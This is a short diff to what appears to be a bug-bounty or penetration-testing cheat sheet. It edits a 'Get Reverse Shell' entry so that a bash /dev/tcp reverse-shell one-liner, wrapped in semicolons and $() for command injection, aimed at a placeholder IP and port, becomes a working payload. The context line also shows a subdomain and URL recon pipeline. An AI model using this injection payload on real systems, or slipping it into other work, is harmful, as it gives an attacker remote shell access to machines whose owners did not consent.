@@ -530,7 +530,7 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 #### Get Reverse Shell:
 
 ```
-$(bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1)
+;$(bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1');
 ```
 
 #### Opposite to Keyhacks -> nokeyhacks:
